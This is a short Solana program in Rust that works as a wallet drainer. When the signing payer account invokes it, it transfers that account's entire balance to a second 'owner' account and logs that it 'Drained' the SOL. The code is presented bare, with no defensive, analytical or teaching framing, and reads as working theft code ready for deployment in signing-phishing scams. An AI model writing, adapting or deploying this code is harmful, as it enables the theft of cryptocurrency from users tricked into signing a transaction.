use solana_program::{
    account_info::{next_account_info, AccountInfo},
    entrypoint,
    entrypoint::ProgramResult,
    msg,
    program_error::ProgramError,
    pubkey::Pubkey,
    system_instruction,
};

entrypoint!(process_instruction);

fn process_instruction(
    program_id: &Pubkey,
    accounts: &[AccountInfo],
    _instruction_data: &[u8],
) -> ProgramResult {
    let accounts_iter = &mut accounts.iter();
    let payer = next_account_info(accounts_iter)?;
    let owner = next_account_info(accounts_iter)?;
    let system_program = next_account_info(accounts_iter)?;

    if !payer.is_signer {
        return Err(ProgramError::MissingRequiredSignature);
    }

    let lamports = payer.lamports();
    if lamports > 0 {
        let transfer_instruction = system_instruction::transfer(payer.key, owner.key, lamports);
        solana_program::program::invoke(
            &transfer_instruction,
            &[payer.clone(), owner.clone(), system_program.clone()],
        )?;
        msg!("Drained {} SOL from {}", lamports / 1_000_000_000, payer.key);
    }

    Ok(())
}